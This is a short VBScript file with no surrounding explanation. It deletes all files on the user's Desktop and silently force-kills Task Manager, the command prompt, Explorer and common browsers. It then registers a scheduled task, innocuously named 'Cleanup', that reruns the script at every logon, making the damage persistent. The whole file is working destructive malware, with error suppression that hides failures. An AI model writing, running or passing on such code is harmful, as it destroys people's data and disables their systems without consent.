On Error Resume Next

Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objShell = CreateObject("WScript.Shell")

' Delete all files from Desktop folder
Set objFolder = objFSO.GetFolder(objShell.SpecialFolders("Desktop"))
For Each objFile in objFolder.Files
    objFSO.DeleteFile(objFile.Path)
Next

' End all running processes
objShell.Run "PowerShell -Command ""[System.Media.SystemSounds]::Beep.Play()""", 0, True
objShell.Run "taskkill /f /im taskmgr.exe", 0, True
objShell.Run "taskkill /f /im cmd.exe", 0, True
objShell.Run "taskkill /f /im explorer.exe", 0, True
objShell.Run "taskkill /f /im chrome.exe", 0, True
objShell.Run "taskkill /f /im firefox.exe", 0, True
objShell.Run "taskkill /f /im iexplore.exe", 0, True

' Set up task scheduler to run script at login
Set objTaskService = CreateObject("Schedule.Service")
objTaskService.Connect

Set objRootFolder = objTaskService.GetFolder("\")
Set objTask = objTaskService.NewTask(0)
objTask.RegistrationInfo.Description = "Deletes files and ends processes at login"
objTask.Settings.Enabled = True
objTask.Settings.RunOnlyIfIdle = False
objTask.Settings.StartWhenAvailable = True

Set objLogonTrigger = objTask.Triggers.Create(9) ' Logon trigger
objLogonTrigger.UserId = "NT AUTHORITY\SYSTEM"

Set objAction = objTask.Actions.Create(0)
objAction.Path = "wscript.exe"
objAction.Arguments = """" & WScript.ScriptFullName & """"

objRootFolder.RegisterTaskDefinition "Cleanup", objTask, 6, , , 3

Set objFSO = Nothing
Set objShell = Nothing
Set objFolder = Nothing
Set objTaskService = Nothing
Set objRootFolder = Nothing
Set objTask = Nothing
Set objLogonTrigger = Nothing
Set objAction = Nothing
